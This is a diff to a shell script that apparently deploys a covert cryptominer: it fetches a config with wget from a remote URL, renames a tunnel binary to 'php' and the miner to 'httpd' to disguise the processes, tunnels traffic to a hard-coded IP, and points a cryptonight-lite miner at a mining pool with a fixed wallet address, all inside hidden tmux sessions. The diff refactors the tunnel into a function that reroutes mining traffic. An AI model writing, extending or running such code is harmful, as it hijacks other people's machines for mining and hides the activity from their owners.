@@ -57,26 +57,35 @@ tmx new -d || { echo "failed to start tmux"; exit 1 ; }
 
 ## glibc not needed on standalone
 ## tnl
-TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
-TNL_CFG=${TNL_CFG:-gst.json}
-TNL_PATH=${TNL_PATH:-$(/usr/bin/which gst)}
-TNL_MASK=${TNL_MASK:-php}
-TNL_CFG_MASK=${TNL_CFG_MASK:-php.ini}
-TNL_ARGS=${TNL_ARGS:--C ${TNL_CFG_MASK}}
-## download cfg
-if [ ! -e "$OBJ_CFG" ]; then
-	  wget -q "${CFG_BASE_URL}${TNL_CFG}" -O "${TNL_CFG_MASK}.tpl"
-fi
-## mask
-mv "$TNL_PATH" "$(dirname ${TNL_PATH})/${TNL_MASK}"
-## config with needed vars
-if [ "$jail" ]; then
-    TNL_PROTO="ss"
-fi
-export TNL_REMOTE="$TNL_REMOTE" \
-       TNL_PROTO
-envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
-tmx new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
+function setup_tnl(){
+    TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
+    TNL_CFG=${TNL_CFG:-gst.json}
+    TNL_PATH=${TNL_PATH:-$(/usr/bin/which gst)}
+    TNL_MASK=${TNL_MASK:-php}
+    TNL_CFG_MASK=${TNL_CFG_MASK:-php.ini}
+    TNL_ARGS=${TNL_ARGS:--C ${TNL_CFG_MASK}}
+    ## download cfg
+    if [ ! -e "${TNL_CFG_MASK}.tpl" ]; then
+        wget -q "${CFG_BASE_URL}${TNL_CFG}" -O "${TNL_CFG_MASK}.tpl"
+    fi
+    ## mask
+    if [ -e "$TNL_PATH" ]; then
+        mv "$TNL_PATH" "$(dirname ${TNL_PATH})/${TNL_MASK}"
+    fi
+    ## config with needed vars
+    if [ "$jail" ]; then
+        TNL_PROTO=${TNL_PROTO:-ss}
+    fi
+    if [ "$lowhw" ]; then
+        TNL_TARGET=${TNL_TARGET:-pool.supportaeon.com:3333}
+    fi
+    export TNL_REMOTE="$TNL_REMOTE" \
+           TNL_PROTO \
+           TNL_TARGET
+    envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
+    tmx kill-session -s ${TNL_MASK} &>/dev/null
+    tmx new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
+}
 
 OBJ_MASK=${OBJ_MASK:-httpd}
 PAUSD_DAEMON=${PAUSD_DAEMON:-pausd}
@@ -168,9 +177,10 @@ while [ "$(tmx list-panes -t ${PAUSD_DAEMON} | wc -l)" -lt 2 ]; do
         PA="WmsNJ3Usa4T7AbXz6ZRTdi5hjrqeXsGFMHEEwpv5g2sbgtEWxJZeBA4hqMusHAyWBVaDktNhZHTvTd6RfngAJNpF1wDzwqaNo"
         ## change algo
         AL="cryptonight-lite"
-        ENDPOINT="pool.supportaeon.com:3333" ## temporary
         ## subst
         cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
+        ## resetup tunnel to correct target
+        lowhw=1 setup_tnl
         ## init
         tmx kill-session -t ${PAUSD_DAEMON}
         tmx new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
